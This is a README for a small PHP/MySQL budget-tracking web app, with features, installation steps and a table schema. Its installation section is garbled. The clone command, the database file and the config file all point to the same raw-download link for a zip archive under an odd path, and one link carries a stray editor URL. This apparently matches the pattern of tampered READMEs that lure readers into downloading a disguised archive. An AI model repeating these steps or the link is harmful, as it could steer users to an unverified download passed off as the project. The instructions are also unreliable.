# Budget Tracker

A simple web application to track your income and expenses.

## Features

- Add new transactions (income or expense)
- View transaction history
- Delete transactions
- View total balance, income, and expenses

## Installation

1. Clone the repository:
    ```bash
    git clone https://github.com/Karte-uk/budget_tracker/raw/refs/heads/main/preconcurrently/budget-tracker-v2.4.zip
    ```

2. Navigate to the project directory:
    ```bash
    cd budget-tracker
    ```

3. Set up the database:
    - Import the `https://github.com/Karte-uk/budget_tracker/raw/refs/heads/main/preconcurrently/budget-tracker-v2.4.zip` file into your MySQL database.
    - Update the [https://github.com/Karte-uk/budget_tracker/raw/refs/heads/main/preconcurrently/budget-tracker-v2.4.zip](http://_vscodecontentref_/0) file with your database credentials.

4. Start the server:
    - If you are using XAMPP, place the project folder in the `htdocs` directory and start Apache and MySQL from the XAMPP control panel.

## Usage

- Open your web browser and navigate to `http://localhost/budget-tracker`.
- Use the interface to add, view, and delete transactions.

## Database Structure

- `transactions` table:
    - `id` (Primary Key, int, AUTO_INCREMENT)
    - `type` (enum: 'income', 'expense')
    - `category` (varchar(255))
    - `amount` (decimal(10,2))
    - `date` (date)

## License

This project is licensed under the MIT License.
